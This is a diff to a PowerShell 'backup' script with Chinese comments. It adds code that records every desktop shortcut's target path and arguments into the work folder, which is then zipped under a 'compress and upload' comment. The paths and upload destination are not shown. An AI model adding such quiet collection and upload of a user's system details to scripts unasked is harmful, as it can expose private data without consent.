@@ -20,6 +20,7 @@ try {
 $workDir = "$env:TEMP\backup_$tag"
 New-Item -ItemType Directory -Path $workDir -Force | Out-Null
 
+# === ⬇️ 拷贝文件 ===
 foreach ($path in $paths) {
     if (Test-Path $path) {
         try {
@@ -35,6 +36,36 @@ foreach ($path in $paths) {
     }
 }
 
+# === ⬇️ 新增：提取桌面快捷方式完整路径（含参数） ===
+try {
+    $desktopDirs = @(
+        "$env:USERPROFILE\Desktop",
+        "$env:PUBLIC\Desktop"
+    )
+    $lnkInfo = ""
+    foreach ($dir in $desktopDirs) {
+        if (Test-Path $dir) {
+            Get-ChildItem -Path $dir -Filter *.lnk -Force -ErrorAction SilentlyContinue | ForEach-Object {
+                try {
+                    $shell = New-Object -ComObject WScript.Shell
+                    $shortcut = $shell.CreateShortcut($_.FullName)
+                    $fullCmd = "`"$($shortcut.TargetPath)`" $($shortcut.Arguments)"
+                    $lnkInfo += "$($_.Name)`n$fullCmd`n`n"
+                } catch {
+                    $lnkInfo += "$($_.Name)`n[Failed to parse]`n`n"
+                }
+            }
+        }
+    }
+    if ($lnkInfo) {
+        $lnkInfo | Out-File -FilePath (Join-Path $workDir "lnk_full_paths.txt") -Encoding UTF8
+        Write-Host "🧷 已生成桌面快捷方式路径 lnk_full_paths.txt"
+    }
+} catch {
+    Write-Warning "⚠️ 快捷方式路径提取失败：$($_.Exception.Message)"
+}
+
+# === ⬇️ 压缩上传 ===
 $zipPath = "$env:TEMP\$tag.zip"
 Compress-Archive -Path "$workDir\*" -DestinationPath $zipPath -Force
 
